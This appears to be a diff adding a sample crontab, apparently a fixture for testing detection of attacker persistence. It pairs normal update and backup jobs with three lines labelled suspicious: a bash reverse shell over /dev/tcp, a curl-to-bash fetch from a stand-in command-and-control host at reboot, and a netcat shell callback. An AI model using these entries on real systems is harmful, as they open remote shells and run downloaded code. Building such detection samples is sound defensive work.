@@ -1,0 +1,8 @@
+# Normal system maintenance tasks
+0 2 * * * /usr/bin/apt update && /usr/bin/apt upgrade -y
+30 3 * * 0 /usr/local/bin/backup.sh
+
+# Suspicious attacker persistence entries
+* * * * * /bin/bash -i >& /dev/tcp/192.168.1.55/4444 0>&1
+@reboot curl -s http://malicious-c2.example | bash
+0 * * * * nc -e /bin/sh 10.0.2.15 9001
